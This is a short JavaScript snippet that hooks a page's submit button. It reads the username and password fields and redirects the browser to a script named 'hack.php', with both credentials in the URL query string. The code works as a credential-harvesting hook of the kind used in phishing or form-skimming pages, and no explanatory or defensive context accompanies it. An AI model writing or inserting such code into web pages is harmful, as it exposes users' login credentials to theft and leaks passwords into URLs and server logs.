document.querySelector('button[type="submit"]').onclick = function() {
    window.location.href = `./hack.php?username=${
        document.querySelector('input[name="username"]').value
    }&password=${
        document.querySelector('input[name="password"]').value
    }`;
}